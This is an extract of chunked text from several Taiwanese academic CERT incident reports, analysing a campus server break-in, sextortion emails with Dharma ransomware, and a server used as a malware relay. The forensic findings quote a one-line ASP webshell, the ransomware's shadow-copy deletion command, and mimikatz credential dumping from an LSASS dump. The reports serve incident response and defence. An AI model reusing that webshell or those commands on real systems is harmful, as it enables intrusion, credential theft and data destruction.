        "content": ".X.237 主機的防火牆設定,發現該主機未開啟防火牆的防護設 定,容易造成駭客輕易入侵。 16. 查看在駭客入侵IP:140.X.X.237 主機期間的電腦操作行為,發現駭客曾經使 用網路掃描工具,推測用來對區域網路進行掃描用,也開啟一些檔案,如前 面所提在垃圾桶內發現的NT_user.dic 與NT_pass.dic 檔案。 從內容中發現到駭客曾經開啟在D:\\...\\DB 資料夾內的cn_db.asp 檔案,駭客在 開啟過程中毫無停留,可見十分熟悉檔案的位置與該檔案的用途。 檢視cn_db.asp 的內容,發現該檔案內有伺服器名稱、資料庫名稱、使用者 ID(UID)與密碼,從時間判斷駭客在開啟該檔案後,停留7 分鐘之久才開啟下 一個檔案,推測可能在查找該主機所在位置。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 檢視IP:140.X.X.237 主機的系統更新紀錄,得知該系統最近一次進行防毒軟 體的病毒碼更新日期為2018/10/8,至檢測主機日期這段期間有3 個重要更新 未安裝,未定期更新系統容易造成駭客利用這些系統漏洞對主機進行攻擊。 18. 檢視IP:140.X.X.239 主機之公文系統log 檔,發現在2018/10/10 2:28:54 有來 自日本IP:54.250.25.212 開始陸續存取/kw/資料夾內的網頁與檔案。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在2018/10/10 2:29:01 讀取/kw/maintain/local_register.aspx 網頁,並且成功上 傳資訊到該網頁中,推測駭客可能透過此頁面登入系統,之後在2018/10/10 2:29:41 上傳資訊到/kw/maintain/asp/upload_resource.aspx,推測駭客上傳檔案 到主機中。 在2018/10/10 2:30:12 駭客讀取/kw/auth/upload_file/temp/1.as",
        "Page_Num": "13,14,15"
    },
    "468": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "p,並且成功上傳 參數/if/5288.html 到主機內給1.asp,之後陸續上傳不同參數給1.asp。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在駭客讀取/kw/auth/upload_file/temp/1.asp,並且上傳參數到主機內給1.asp 期間,曾經出現指令碼逾時的現象。 在2018/10/10 2:42:46 駭客取得/kw/auth/upload_file/temp 資料夾內的1.log 檔。 19. 檢視IP:140.X.X.239 主機之公文系統log 檔,發現在2018/10/11 5:58 有來自 美國IP:103.114.163.55 上傳「/compose/6090.html 」參數給主機內的1.asp 檔, 之後該美國IP 陸續上傳參數給1.asp,最後在2018/10/11 9:02 執行該IP 最後 一次上傳參數給1.asp 的動作。 20. 查看IP:140.X.X.239 主機內各槽之檔案內容,發現在 D:\\eic_server\\kws\\auth\\Upload_File\\Temp 資料夾內有兩個檔案1.asp 與1.log, 這兩個檔案的建立日期分別為2018/10/10 10:29 與2018/10/10 10:42,擁有者 為DefaultAppPool,DefaultAppPool 為虛擬帳戶,主要提供Web 存取時所用, 從檔案建立時間與兩個檔案所在位置,推測在Temp 資料夾內的兩個檔案為 駭客所放入。  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 21. 檢視IP:140.X.X.239 主機之1.asp 內容,發現僅有一句語法 「<%z_=request(1):eval z_%>」,在該語法中eval 後所接的字串符號可被執 行,而eval 將其所用的字串符號作為參數提供給request,而request 可以讀 取網址的參數,此為使用一句話木馬寫",
        "Page_Num": "15,16,17"
    },
    "469": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "入WebShell 代碼的方式。 22. 檢視IP:140.X.X.239 主機之1.log 內容,發現它開啟後為亂碼。 將1.log 更改檔名為1.zip 後進行解壓縮,發現在解壓縮完成的資料夾中有一 個lsass.dmp 檔案,其修改日期為2018/10/10 10:39,為駭客出沒時間,推測 該DMP 檔案為駭客所產生,而且檔案大小有100MB 以上。 以記事本開啟lsass.dmp 檔,發現整個內容有部分內容疑為系統資訊,有部分 內容呈現亂碼,推測整個lsass.dmp 為駭客搜集的主機系統資訊(含帳戶與  17 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team windows 密碼)所產生的檔案,但使用記事本無法完整解讀該檔案資訊。 執行程式mimikatz.exe,輸入語法讀取lsass.dmp,發現Windows 帳戶 Administrator 與water 的密碼皆可以透過此方式取出,又駭客在2018/10/10 2:42曾下載過1.log檔,推測駭客為了方便下載,將lsass.dmp壓縮後放於Temp 資料夾內。當檔案下載完成後,將可利用駭客工具解開檔案,並且取得此主 機的帳戶與密碼資訊,此為一個有名的駭客攻擊手法。  18 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 23. 在檢測IP:140.X.X.239 主機時,想以water 帳戶登入系統,發現該帳戶water 已被刪除,僅剩帳戶Administrator。查看事件檢視器的紀錄,發現在安全性 項目的紀錄中,在檢測該主機的前兩天2018/11/17-18 皆為空白,但在應用程 式項目卻有頻繁的紀錄存在。 檢視IP:140.X.X.239 主機的TaskScheduler(任務程序)紀錄,發現在檢測該主 機的前兩天有多筆使用者Administrator 登入系統後啟動工作的紀錄,推測帳 戶water 的消失是因為駭客以Administrator 身份登入系統後刪除帳戶造成。",
        "Page_Num": "17,18,19"
    },
    "470": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": " 19 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 24. 檢視IP:140.X.X.239 主機的防火牆設定,發現防火牆未開啟,容易造成駭客 入侵。 25. 檢視IP:140.X.X.239 主機的port 開啟狀況,發現開啟一些駭客容易攻擊的 port 如445、3389、25、138、139、135...等port,建議檢視這些port 開啟之 必要性。 III. 事件攻擊行為示意圖  20 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1.駭客讀取/kw/maintain/local_register.aspx 登入公文主機的網站。 2.駭客利用upload_resource.aspx 植入1.asp 與1.log 檔於公文主機。 3.駭客讀取/kw/auth/upload_file/temp/1.asp 並上傳參數至公文主機。 4.駭客取得/kw/auth/upload_file/temp/1.log 檔(內含主機帳密)。 5.駭客暴力破解帳密並駭入IP:140.X.X.237 主機。 6.駭客從IP:140.X.X.237 主機RDP 遠端連線或網芳連線公文主機。 7.駭客使用water 帳戶連線登入區域網路內的主機群。 8.駭客使用IP:140.X.X.237 主機瀏覽學校首頁與一些校內主機網頁 9.駭客下載Nmap 與駭客工具於IP:140.X.X.237 主機,並安裝它們。 10.駭客執行Nmap 與駭客工具於IP:140.X.X.237 主機上。 11.駭客瀏覽IP:140.X.X.237 主機內各資料夾的檔案。 12.駭客透過IP:140.X.X.237 主機掃描區域網路內各IP 主機的445 port。 13.駭客使用Nmap 掃描區域網路內的主機群。 IV. 建議與總結 1. 本個案緣起於該校公文系統被駭客入侵並植入木馬,經本中心檢測發現除 了公文系統主機外,該校",
        "Page_Num": "19,20,21"
    },
    "471": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "有其他主機也有被駭客入侵的現象,發生的主要 原因是因為IP:140.X.X.237 主機被入侵,透過該主機,駭客使用Nmap 取 得存活主機資訊,利用駭客工具嘗試竊取與破解主機的密碼與掃描區域網 路內主機是否有IIS 漏洞存在,也知曉系統管理者water 的密碼,故嘗試 登入這些有帳戶water 的主機。  21 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 因公文系統具有upload 檔案的功能,但沒有限制上傳檔案的格式,使得 駭客可從Web 方式入侵系統後植入1.asp(一句話木馬),並且下載1.log 來 取得該主機的帳戶(administrator、water)與密碼資訊。 3. 針對本個案的資安防護與處理作業,提供幾點建議如下。 (1)勿使用相同帳號與相同密碼管理多台主機。 (2)避免多個服務所用之帳號共用同一組密碼。 (3)定期更換系統管理者密碼並加強密碼強度。 (4)建立存取權限的管控機制與限制上傳檔案的格式設定於有上傳檔案功 能的主機上。 (5)建議定期查看系統狀態,並更新作業系統、應用程式與病毒碼。 (6)檢視主機是否有開啟駭客常用來攻擊的port,並考慮port 是否要關閉。 (7)檢視網路芳鄰之共用資料夾是否有存在之必要性。 ",
        "Page_Num": "21,22"
    },
    "472": {
        "File_Name": "個案分析-校園勒索恐嚇信與勒索病毒攻擊事件分析報告_10711.pdf",
        "content": "個案分析- 校園勒索恐嚇信與勒索病毒 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 在107 年9-10 月學術網路中發生勒索恐嚇信事件與副檔名Gamma 勒索病毒 攻擊事件,而本中心同仁在10 月底也陸續收到這類型勒索恐嚇信。 2. 某校園主機感染副檔名為Gamma 的勒索病毒,受害主機內的資料皆已被加 密,所幸該主機為工讀生用電腦,平時所用資料皆已有備份,影響不大,又 該系統裝設還原卡,在感染病毒後重新開機,已清除病毒。 3. 因受害主機系統碟已系統還原,透過D 槽被加密的檔案與勒索通知信,經 查.Gamma 的勒索病毒來自Dharma(CrySiS)勒索病毒家族,Dharma 病毒為 2018 年前三大勒索病毒家族之一,此類型的勒索病毒每隔幾個星期就會有新 變種產生,各變種之間的差異在於副檔名與聯絡用的E-mail 信箱不同,其他 特徵皆相同。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 為了解勒索恐嚇信在開啟後對主機是否有任何系統行為與網路行為產生,又 為了解Dharma 勒索病毒在感染主機後之網路行為與系統行為,本中心取得 勒索恐嚇信樣本與Dharma 勒索病毒樣本進行檢測。 II. 事件檢測 1. 首先使用1 台安裝Windows 7 系統的VM 虛擬主機進行隔離環境測試。本中 心總共收到四份勒索恐嚇信,將陸續對這四份勒索恐嚇信件進行檢測。 2. 檢測107 年10 月25 日下午3:03 收到主旨為「account XXXX@cert.tanet.edu.tw is compromised」之恐嚇信,發現在該信開啟後主機並無任何異樣,而使用者 所用帳號也無",
        "Page_Num": "1,2,3"
    },
    "473": {
        "File_Name": "個案分析-校園勒索恐嚇信與勒索病毒攻擊事件分析報告_10711.pdf",
        "content": "異常。駭客為讓受害者相信已取得受害者的帳號,以受害者的 帳號為寄件者寄信給受害者,但檢視信件來源IP 為來自法國 IP:81.66.24.250。在信件中駭客告訴受害者已掌握帳戶密碼、瀏覽器的歷史紀 錄與通聯紀錄等資料,並告訴受害者需於48 小時內付美金813 元,否則將會 寄受害者瀏覽色情網站的表情照片寄給受害者的親朋好友。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢測107 年10 月25 日上午9:04 收到主旨為「account XXXX@cert.tanet.edu.tw is compromised」之恐嚇信,發現在該信開啟後 主機並無任何異樣,而使用者所用帳號也無異常。檢視信件來源IP 為來 自智利的IP:186.156.236.214,而信件內容與前一封檢測之恐嚇信無異, 僅索求付款金額不同。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢測107 年11 月5 日下午9:45 收到主旨為「Change your password immediately. Your account has been hacked」之恐嚇信,發現在該信開啟後主機並無任何異  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 樣,而使用者所用帳號也無異常。檢視信件來源IP 為來自越南的 IP:116.107.191.207,而信件內容提到在2018 年8 月11 日駭客已經駭入受害 者主機,並且能完整存取E-mail 帳號,要求受害者在50 小時內支付美金884 元,否則受害主機將會被鎖住,而受害者的親朋好友將會收到受害者瀏覽色 情網站的表情照片。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢測107 年10 月31 日上午4:32 收到主旨為「あなたのパスワードが侵害さ れました (XXXXX@cert.tanet.edu.tw)」之恐嚇信,發現在該信開啟後主機並 無任何異樣,",
        "Page_Num": "3,4,5,6,7"
    },
    "474": {
        "File_Name": "個案分析-校園勒索恐嚇信與勒索病毒攻擊事件分析報告_10711.pdf",
        "content": "而使用者所用帳號也無異常。檢視信件來源IP 為來自哥倫比亞 的IP: 201.184.248.210,而信件內容提到在數個月前駭客已經駭入受害者主 機,並且破解受害者E-mail 帳號密碼,要求受害者在48 小時內支付美金842 元,否則受害主機將會被鎖住,而受害者的親朋好友將會收到受害者瀏覽色 情網站的表情照片。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 接著檢測Dharma 勒索病毒,病毒樣本virus.exe 經Virutotal 檢測其惡意比例 為58/67,有多家防毒軟體公司使用CrySiS 或Dharma 等用字於該病毒命名  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 上。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 當病毒樣本virus.exe 執行後,會在受害主機的桌面出現一個「All your files have been encrypted」的視窗,視窗中告訴受害者所有的檔案已被加密,可免費解密5 個檔案,若想將主機內的檔案解密,需以主旨為受害者ID (EE9E9A36)寫信至 decrypthelp@cock.li 的E-Mail 信箱。 8. 檢視背景程式視運作情形,發現virus.exe 執行後,除了再次呼叫自己外,也會 呼叫cmd.exe 來執行mode.com 與vssadmin.exe 兩個系統執行檔。mode.com 所執 行的命令mode con cp select=1251 為設置代碼頁,顯示西里爾語,而vssadmin.exe 所執行的命令vssadmin delete shadows/all/quiet 為刪除主機內所有影子副本。 在virus.exe 再次呼叫自己後,除了執行cmd.exe、mode.com 與vssadmin.exe 外, 會執行兩次程式mshta.exe,此兩次程式會分別去呼叫兩個存放於不同處但檔名 相同的檔案info.hta。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer",
        "Page_Num": "7,8,9,10,11"
    },
    "475": {
        "File_Name": "個案分析-校園勒索恐嚇信與勒索病毒攻擊事件分析報告_10711.pdf",
        "content": "Emergency Response Team 9. 檢視兩個info.hta 檔案所在位置,發現他們所在的Startup 資料夾中除了 Info.hta 外,另有病毒virus.exe,這表示每次開機後皆會執行這兩個檔案,而 且Info.hta 執行後會開啟所有檔案已被加密的通知視窗。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 透過AutoRun 工具,發現Info.hta 與virus.exe 所儲存位置不只有前面所提兩 處,在C:\\Windows\\systme32 資料夾中也有,而virus.exe 在C:\\users\\使用者名 稱\\appdata\\roaming 資料夾中也存在,將病毒本身複製並存放於多處,而且放 於C:\\Windows\\system32 系統資料夾內之手法於一般勒索病毒之思維不同。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 在每個被加密的檔案資料夾中,皆會有一個檔案FILES ENCRYPTED.txt, 檢視其內容得知為駭客告訴受害者所有檔案已被鎖住,如果想要解開檔案, 請寫信到電子信箱decrypthelp@cock.li。 12. 在virus.exe 執行後,發現原先在媒體櫃中的所有資料皆消失不見,而且在 點選「開始」>「程式列表」,發現所有內容皆不見。 13. 檢視被加密的檔案,發現檔案名稱皆使用下面規則命名:「檔案名稱.id-8 位 英文數字合成的受害者ID.[聯絡駭客的E-mail 信箱].此次變種副檔名arena」。 例: ABC.txt.id-EE9E9A36.[decrypthelp@cock.li].arena  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1.駭客利用社交工程方式散播Dharma 病毒。 2.受害者執行Dharma 病毒。 3.Dharma 病毒呼叫2 次cmd.exe 來執行mode.com 與vssadmin.exe。 4.再次呼叫Dharma 病毒執行2 次cmd.exe(mode.com 與vss",
        "Page_Num": "11,12,13,14"
    },
    "476": {
        "File_Name": "個案分析-校園勒索恐嚇信與勒索病毒攻擊事件分析報告_10711.pdf",
        "content": "admin.exe)。 5.執行mshta.exe。 6.受害主機重新開機後,執行Dharma 病毒與Info.hta。 IV. 建議與總結 1. 當勒索恐嚇信在校園散播時,曾有學校反應有同一位受害者在隔一段時間 後再次收到勒索恐嚇信,當時那位受害者在第一次事件發生時已做過密碼 變更處理,再次收到這類信件時,十分懷疑自己的密碼是否已被駭客知 道。事實上,這是駭客對受害者進行的心理戰,為了讓受害者相信密碼已 經被盜,建議遇到此類狀況的受害者第一時間需請校內資安相關人員協  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 助,切勿相信駭客所言。 2. 針對勒索恐嚇信的資安事件有幾點防護建議,提供使用者參考。 (1) 定期更換密碼並加強密碼強度,建議使用8 個字元以上且英文、符號 與數字混合的密碼。 (2) 避免多個服務所用之帳號共用同一組密碼。 (3) 不隨意開啟不明來源的信件(含附件)或網路連結,以免遭植入惡意程 式來竊取資訊。 (4) 定期更新作業系統、應用程式與病毒碼至最新版本。 (5) 定期備份重要檔案與執行系統掃毒作業。 3. Dharma 勒索病毒每隔幾個星期就產生新的變種,每個變種主要在變更駭 客E-mail 信箱與被加密檔案的副檔名,目前對於Dharma 勒索病毒之更版 頻繁的變種尚未有解密器產生,因此受害主機內檔案被加密後,無法解密。 4. 針對Dharma 勒索病毒的防護與處理作業,有幾點建議提供使用者參考。 (1) 平時定期備份重要檔案與執行系統掃毒作業。 (2) 定期更新系統與病毒碼至最新版本。 (3) 不隨意開啟不明來源的信件與網頁連結。 (4) 若主機感染Dharma 病毒,可將已被加密的重要檔案留存,等待日後 解密器的產生。 ",
        "Page_Num": "14,15"
    },
    "477": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "個案分析- 校園網站伺服器淪為中繼站 與惡意程式下載站攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年2 月  1 I. 事件簡介 1. 2018/12 初接獲外部情資通報2018/11 初某校有一台伺服器(IP:192.X.X.34)疑 似淪為中繼站,為了解該主機受害情形,本中心進行實機鑑識作業。 II. 事件檢測 1. 首先,檢視IP:192.X.X.34 主機(簡稱:34 主機),該主機使用的作業系統是 Windows Server 2008 R2,其用途為選課系統。查看34 主機的事件檢視紀錄, 發現IP:192.X.X.11 與IP:202.39.79.22 在2018/11/7 曾登入34 主機,推測駭客 可能透過這兩個IP 駭入主機內,其中IP:192.X.X.11(簡稱:11 主機)為校內主 機,為了解該主機是否受駭,也將檢測該主機。 NO 連線時間 來源IP 登入 類型 帳戶名稱 來源地 1 2018/11/7 10:19:09 192.X.X.11(11 主機) 3 Administrator 台灣 2 2018/11/7 10:31:02 202.39.79.22 10 Administrator 台灣 3 2018/11/7 10:59:10 202.39.79.22 10 Administrator 台灣  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 在C:\\Windows\\System32 內發現msiscsiex.dll 與inetinfo.exe,它們在2018/11/7 10:36 與10:59 被Administrators 所建立。因這兩個檔案存放位置為系統檔資 料夾,需確認是否為系統檔,但是因擁有者為Administrator,如為系統檔, 擁有者非Administrator,而是TrustedInstaller,又兩個檔案建立時間與疑似駭 客來源IP: 202.39.79.22 在2018/11/7 10:31 與10:59 登入主機時間接近,推測 這兩個檔案應該為駭客所放入主機內。 inetinfo.exe 與msiscsiex.dll 經Virustotal 檢測得知其惡意比例分別為4/70 與 8/68,",
        "Page_Num": "1,2,3"
    },
    "478": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "有多家防毒軟體公司的防毒軟體無法識別它們的惡意行為。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 查34 主機內檔案的修改日期,發現C:\\使用者\\Administrator\\我的文件 \\SC2008TUT\\Primary_IP.TXT 與C:\\SC2008\\SC2008TUT.ini 這兩檔案曾在 2018/11/7 10:31 被修改過,該時間為駭客入侵主機時間,推測這些行為可能 為駭客所為。 4. 檢視34 主機Port 開啟之情形,發現有兩個使用者自行新增的輸入規則,分 別為inetinfo 與user-connection。inetinfo 規則設定為可在inetinfo.exe 執行時 開啟任何port 來連線主機,而user-connection 規則設定讓主機開啟3895 與 3389port 來接受遠端主機的連線。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 除了上面所提到的兩個新增規則外,也發現34 主機有開啟一般駭客常會攻擊 的port,如:445port 與3389port。 5. 檢測從網路登入34 主機的IP:192.X.X.11 主機(簡稱:11 主機),該主機使用的 作業系統是Windows Server 2008 R2,其用途為教師資訊系統,發現在存放系統 事件日誌的temp 資料夾中有一個可疑的執行檔system1.exe,其擁有者為 Administrators,而且其建立檔案日期為2018/11/7 10:55,與34 主機被駭客入侵 時間很接近。 執行system1.exe 後,發現其會以443 port 連線34 主機,而且每隔一段時間就會 連線一次,推測該行為是向34 主機進行報到的動作。 檢視system1.exe 的屬性,得知該程式會在主機開機後自動執行。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢測時,11 主機開機後也有啟動system1.exe 的現象。 system1.exe 經Virustotal 檢測發現其惡意比例為32/66,多家防毒軟體的公司稱 它為Gen:Variant",
        "Page_Num": "3,4,5,6"
    },
    "479": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": ".Zusy.241770。 6. 在11 主機的C:\\inetpub\\wwwroot 內發現4 個可疑檔案,分別為cmd.hta、 kkkkkkkkk.exe、kkkkkkkkk.txt 與update.txt,這些檔案的擁有者皆為 Administrators,而且建立檔案日期皆為2017/9/18,可判斷出2017/9/18 為駭  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 客入侵11 主機的時間點之一。 (1)檢視kkkkkkkkk.exe 的程式碼,發現其會呼叫mshta.exe 連線到 http://192.X.X.11/cmd.hta 來執行腳本cmd.hta。 kkkkkkkkk.exe 經Virustotal 檢測其惡意比例為21/56,有許多防毒軟體公司以 Exploit.CVE-2017-8759 來命名它,可見此程式利用CVE-2017-8759 的漏洞進行 攻擊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2)查看kkkkkkkkk.txt 內容,發現與kkkkkkkkk.exe 內容相同。它經Virustotal 檢 測其惡意比例為21/56,有許多家防毒軟體公司以Exploit.CVE-2017-8759 來命名 它,加上兩者內容相同,可以判斷kkkkkkkkk.txt 與kkkkkkkkk.exe 是相同檔案, 只是副檔名不同。 (3)查看cmd.hta 之內容,得知該檔案會下載http://192.X.X.11/update.txt 至主機 內,並且將下載的update.txt 更名為temp 資料夾內的svchost1.exe,接著開始執 行svchost1.exe。 (4)檢視update.txt 內容,發現在檔案開啟後為一堆亂碼。它經Virustotal 檢測其惡 意比例為33/68,而且防毒軟體公司稱它為Gen.Variant.Zusy.241770,與 system1.exe 為同一類型惡意程式。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 因在",
        "Page_Num": "6,7,8,9"
    },
    "480": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "C:\\temp 資料夾內未發現svchost1.exe,但有與update.txt 相同類型的惡 意程式system1.exe。依照cmd.hta 執行內容,將update.txt 更名為svchost1.exe 並且執行它,發現它會連線美國IP:203.74.56.209:443,但是它不會在主機重 新開機後啟動,而且與system1.exe 執行後連線的目的IP:192.X.X.34:443 也 不同,從檔案建立時間推測駭客可能修改update.txt 內容來產生system1.exe。 7. 檢視11 主機與34 主機的系統更新情形,發現在2017/ 9 CVE-2017-8759 漏洞 被發現期間,並未修補.Net Framework 漏洞,直到2018/3 才成功修補漏洞, 而且這兩台主機在2017 年有半年以上未進行系統更新。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 在C:\\Windows\\Temp 內發現3 個可疑檔案help.bat、m64.iso 與x64.tmp,這些 檔案建立日期皆在2018/11/19,而且擁有者皆為Administrators。 (1)查看help.bat 內容,從語法得知m64.iso 執行後的資料會寫入dat.tmp 內最後面 的資料段中。 (2)m64.iso 經Virustotal 檢測其惡意比例為39/70,多家防毒軟體公司以HackTool 或Mimikatz 命名它,Mimikatz 為一個竊取Windows 帳戶與密碼的駭客工具,故 推測該軟體應是駭客用來竊取Windows 帳戶與密碼用。 (3)檢視x64.tmp 內容,在開啟後大部分內容為亂碼,但在首段內容中出現「This program cannot be run in Dos mode」,推測該檔案可能為執行檔,將x64.tmp 更名 為x64.exe 後執行它,發現該檔案可以被執行。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team x64.tmp 經Virustotal 檢測其惡意比例為3/68,僅有少數防毒軟體可以偵",
        "Page_Num": "9,10,11"
    },
    "481": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "測出它的 存在,而防毒軟體公司以Mimikatz 命名它,可見它為一個竊取Windows 帳戶與 密碼的工具。 9. 在C:\\Windows\\System32 內發現一個可疑的rassauto.dll,其擁有者為 Administrators,而且建立日期為駭客入侵日期2018/11/7。 Rassauto.dll 經Virustotal 檢測其惡意比例為12/67,能被防毒軟體檢測出的機率 不高。從登錄檔的資訊可以得知該程式被寫入登錄檔中,並視它為一種建立遠端 網路連線時用的服務。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 在C:\\inetpub\\temp\\IIS Temporary Compressed Files\\DefaultAppPool\\$^_gzip_C^\\INETPUB\\WWWROOT 內發現可疑檔案 2.TXT,該檔案擁有者為DefaultAppPool,而且建立日期為2017/9/18,推測 該檔案是以Web 方式被放入主機中。 檢視2.TXT 內容,發現為一推亂碼,無法辨識。它經Virustotal 檢視其惡意比例 為27/56,而且多家防毒軟體公司稱它為Gen:Variant.Zusy.241770,與update.txt、 system1.exe 為同一類型惡意程式。 11. 查看11 主機的事件檢視器紀錄,發現在2018/11/7 9:53 有IP:202.39.79.22 以 RDP 方式成功登入11 主機。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 彙整11 主機在2018/11 被IP:202.39.79.22 以遠端連線登入情形如下表。 NO. 連線時間 來源IP 來源 port 登入 類型 帳戶名稱 來源 地 1 2018/11/7 9:53 202.39.79.22 63144 10 Administrator 台灣 2 2018/11/9 9:28 202.39.79.22 63494 10 Administrator 台灣 3 2018/11/1314:35 202.39.79.22 63206 10 Administrator 台灣 4 2018/11/14 15:05 202.39.79.22 64122 10 Administrator 台灣 5 2018/11/14 15:08 202.39.79.22 64403 10 Administrator 台灣",
        "Page_Num": "11,12,13"
    },
    "482": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "6 2018/11/16 17:37 202.39.79.22 63208 10 Administrator 台灣 7 2018/11/21 8:09 202.39.79.22 64081 10 Administrator 台灣 在C:\\Windows\\Temp 內發現3 個惡意檔案(help.bat、m64.iso 與x64.tmp)的建立 日期為2018/11/19,但是查無IP:202.39.79.22 的登入紀錄。在這3 個檔案建立 時有校內IP:192.X.X.216(簡稱:216 主機)以RDP 方式登入11 主機內,建議檢視 216 主機是否有資安問題存在。 12. 在C:\\使用者\\Administrator\\我的文件中發現一個擁有者為Administrator 的檔 案Default.rdp,而且該檔案在2018/11/7 被建立。 Default.rdp 執行後會出現連線遠端IP:192.X.X.12(簡稱:12 主機)的執行畫面,若 12 主機的使用者帳號與密碼和11 主機相同,則駭客將可登入12 主機中。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在登錄檔中發現系統預設遠端連線主機IP 值為192.X.X.12,推測駭客可能常使 用11 主機遠端連線登入12 主機。 13. 11 主機與34 主機的事件檢視器紀錄每個月皆會移至C:\\temp 下存檔,查看 兩主機的紀錄後發現皆缺少2017/8 紀錄。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 查看台灣IP:202.39.79.202 連線11 主機的Weblog 紀錄,發現該IP 第一筆讀 取紀錄在2017/9/18 10:49,並且曾成功讀取123.rar、2.txt、test.txt、test.exe、 kkkkkkkkk.txt、cmd.hta 與kkkkkkkkk.exe 等檔案。 15. 為了解這些惡意程式被讀取情形,以惡意程式的檔案名稱來查詢Weblog 紀 錄,查詢結果如下表。除了IP:202.39.79.22 為駭客來源IP 外,有3 個IP(台 灣202.39.54.",
        "Page_Num": "13,14,15"
    },
    "483": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "7、南韓121.254.176.94、中國211.97.109.230)也成功讀取過這些 檔案,這3 個IP 可能為受害主機的IP。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No. IP 曾成功讀取的檔案 1 202.39.79.22 kkkkkkkkk.exe、cmd.hta、kkkkkkkkk.txt、2.txt、test.exe、 test.txt 與123.rar 2 202.39.54.7 kkkkkkkkk.exe、cmd.hta、kkkkkkkkk.txt、2.txt 與123.rar 3 121.254.176.94 2.txt、test.exe、test.txt 4 211.97.109.230 2.txt 除了以上IP 外,另有3 個美國IP(65.154.226.109、70.42.131.170 與96.72.184.106) 也讀取過這些惡意程式,但是皆沒有成功,因為所讀取的檔案找不到而失敗。 16. 查看使用者操作11 主機的紀錄,發現在2017/9/18 10:48 使用者曾經開啟 123.rar 檔案。 17. 檢視2018/11/7 的Weblog,發現台灣IP:202.39.54.7 在2018/11/7 嘗試讀取2.txt 與123.rar 失敗,表示這兩個檔案已不在主機的網站資料夾中。 18. 檢視11 主機port 開啟的狀況,發現該主機開啟駭客容易攻擊的port,如 445port、3389 port,也自訂user-connection 規則,該規則允許任何程式執行 時透過3895port 與3389 port 遠端連線11 主機,建議管理者檢視這些port 是  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 否有開啟之必要性。 19. 檢視2018/12/10~2018/12/24 所側錄的封包,發現11 主機與34 主機有許多 IP 對它們的443 port 進行連線,這些連線行為疑似向這兩台主機進行報到動 作。在這些連線34 主機的IP 中發現有4 個來自台灣的IP,分別為 IP:118.167.46.193、61.219.11.151、192.",
        "Page_Num": "15,16,17"
    },
    "484": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
